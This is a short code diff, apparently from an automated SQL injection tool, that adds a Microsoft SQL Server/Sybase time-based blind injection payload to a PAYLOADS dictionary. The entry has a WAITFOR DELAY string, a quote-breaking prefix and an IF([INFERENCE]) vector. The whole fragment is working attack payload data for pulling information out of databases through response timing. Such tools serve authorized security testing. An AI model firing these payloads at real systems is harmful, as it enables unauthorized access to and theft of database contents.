@@ -1206,6 +1206,15 @@ PAYLOADS = {
         ],
         "time-based": [
             {
+                "payload": "WAITFOR DELAY '0:0:[SLEEPTIME]",
+                "comments": [
+                    {"pref": "' ", "suf": ""}
+                ],
+                "title": "Microsoft SQL Server/Sybase time-based blind (IF - without closing quote)",
+                "vector": "IF([INFERENCE]) WAITFOR DELAY '0:0:[SLEEPTIME]",
+                "dbms": "Microsoft SQL Server",
+            },
+            {
                 "payload": "WAITFOR DELAY '0:0:[SLEEPTIME]'",
                 "comments": [
                     {"pref": " ", "suf": "--"},
